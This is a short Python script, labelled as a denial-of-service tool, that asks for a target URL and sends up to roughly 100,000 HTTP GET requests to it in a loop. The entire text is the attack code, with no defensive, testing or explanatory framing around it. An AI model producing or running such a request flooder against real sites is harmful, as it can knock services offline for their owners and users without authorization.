import requests

target_url = input("Enter URL address of DoS Target: ")

count = 0
while True:
    res = requests.get(target_url)
    count += 1

    if count > 100000:
        break;
